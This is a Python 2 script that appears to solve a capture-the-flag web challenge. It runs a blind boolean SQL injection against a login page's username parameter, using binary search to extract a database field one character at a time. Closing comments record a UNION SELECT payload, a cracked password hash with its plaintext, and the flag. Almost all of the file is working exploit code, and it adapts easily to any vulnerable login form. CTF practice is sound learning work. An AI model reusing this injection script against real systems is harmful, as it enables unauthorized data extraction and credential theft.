#!/usr/bin/env python

import urllib
import urllib2
import sys

URL = "https://challenges.neverlanctf.com:1165/login.php"
UA =  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.90 Safari/537.36"
Cookie = "PHPSESSID=bhon2smt11sccq4nehiglstqaj"

def logout():
    uurl = URL + "?logout"
    req = urllib2.Request(uurl, {}, {
        'User-Agent': UA,
        'Cookie': Cookie
    })
    res = urllib2.urlopen(req)
    

def query(Q):
    logout()
    UURL = URL + "?password=1&username=" + urllib.quote(Q)
    req = urllib2.Request(UURL, {}, {
        'User-Agent': UA,
        'Cookie': Cookie
    })

    res = urllib2.urlopen(req)
    text = res.read()
    if "location.href" in text:
        print "Session expired..."
        sys.exit()
    # print text
    return "<h2>Welcome" in text

def find_length():
    left = 0
    right = 200 # (left, right]
    while left < right:
        mid = (left+right)//2
        print "Finding... {} {} {}".format(left, mid, right)
        if query("john' and length(name) > {}-- ".format(mid)):
            left = mid+1
        else:
            right = mid
    return right

def find_ch(pos):
    print "Finding pos {} th character".format(pos)
    left = 0
    right = (1<<8)
    while left < right:
        mid = (left+right)//2
        print "Finding... {} {} {}".format(left, mid, right)
        if query("john' and ord(substr(name,{},1)) > {}-- ".format(pos, mid)):
            left = mid+1
        else:
            right = mid
    print "COOL!! {} = {}".format(pos, right)
    return right

LENGTH = find_length()
print "LENGTH = {}".format(LENGTH)
PASSWORD = ""
for i in range(1, LENGTH+1):
    PASSWORD += chr(find_ch(i))
    print PASSWORD

print PASSWORD

query(PASSWORD)

"""
john / 0a4b0ae54adbdc2825e1b05e16c7164cfdfce29e8f6fd104c7e539fc39e5c619
0a4b0ae54adbdc2825e1b05e16c7164cfdfce29e8f6fd104c7e539fc39e5c619 -> sha256(T3stUs3r)
"""
"""
{
    "name": "John",
    "id": 1,
    "password": 'sha256 hash'
}
username:
dddd'union select '2', '2','3','4','5'-- 
pw:
1
flag{esc4p3y0ur1nputs}
"""